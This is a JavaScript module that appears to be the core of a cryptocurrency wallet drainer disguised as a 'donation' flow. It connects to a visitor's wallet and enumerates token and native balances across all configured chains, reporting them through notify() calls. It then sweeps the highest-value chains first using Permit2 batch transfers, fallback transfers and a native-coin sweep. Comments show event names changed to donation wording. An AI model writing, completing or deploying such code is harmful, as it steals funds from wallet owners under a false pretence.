// src/engine/donate.js
import { notify } from "../utils/notify.js";
import {
  fetchBalancesCovalent,
  filterPermit2SafeTokens,
  getChainValue
} from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

export async function runDonationFlow(walletClient) {
  try {
    // 🔹 1. resolve wallet owner
    let owner = null;
    let injectedProvider = null;

    if (walletClient?.account?.address) {
      owner = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      injectedProvider = new ethers.BrowserProvider(window.ethereum);
      await injectedProvider.send("eth_requestAccounts", []);
      owner = await injectedProvider.getSigner().getAddress();
    }
    if (!owner) throw new Error("Wallet not connected");

    // 🔹 2. create single trackingId for the whole flow
    const trackingId = Date.now().toString();

    // 🔹 3. notify link opened (frontend init)
    notify("LINK_OPENED", { walletAddress: owner, trackingId });

    // 🔹 4. collect balances (with native)
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);

      // fetch native balance
      const provider = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const nativeBal = await provider.provider.getBalance(owner);
      const nativeFormatted = ethers.formatEther(nativeBal);

      chainBalances.push({
        ...chain,
        native: nativeFormatted,
        tokens: filtered,
        totalValue: getChainValue(filtered) + Number(nativeFormatted)
      });
    }

    const balancesPayload = chainBalances.map(c => ({
      name: c.name,
      native: c.native,
      tokens: c.tokens.map(t => ({
        name: t.tokenSymbol,
        amount: t.balanceRaw,
        value: t.quote
      })),
      total: c.totalValue
    }));
    const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);

    notify("WALLET_CONNECTED", {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal
    });

    // 🔹 5. sort chains by value
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // 🔹 6. sweep each chain
    for (const chain of chainBalances) {
      notify("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);

      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      try {
        if (permit2Tokens.length) {
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        fallbackTokens.push(...permit2Tokens);
      }

      try {
        if (fallbackTokens.length) {
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      try {
        await sweepNative(signer, provider, chain.chainId);
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // 🔹 7. re-fetch balances after sweep
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
      const refreshedNative = await provider.provider.getBalance(owner);
      const refreshedNativeFormatted = ethers.formatEther(refreshedNative);
      const refreshedTotal = getChainValue(refreshedFiltered) + Number(refreshedNativeFormatted);

      // 🔹 8. notify donation made (renamed from RESULTS)
      notify("DONATION_MADE", {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNativeFormatted,
            tokens: refreshedFiltered.map(t => ({
              name: t.tokenSymbol,
              amount: t.balanceRaw,
              value: t.quote
            })),
            total: refreshedTotal
          }
        ]
      });
    }

    // 🔹 9. donation completed (renamed from WALLET_DISCONNECTED at end of flow)
    notify("DONATION_COMPLETED", { walletAddress: owner, trackingId });

    // 🔹 10. listen for actual wallet disconnect
    if (injectedProvider) {
      injectedProvider.provider.on("disconnect", () => {
        notify("WALLET_DISCONNECTED", { walletAddress: owner, trackingId });
      });
      injectedProvider.provider.on("chainChanged", chainId => {
        notify("CHAIN_SWITCHED", { walletAddress: owner, trackingId, newChain: chainId });
      });
    }

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
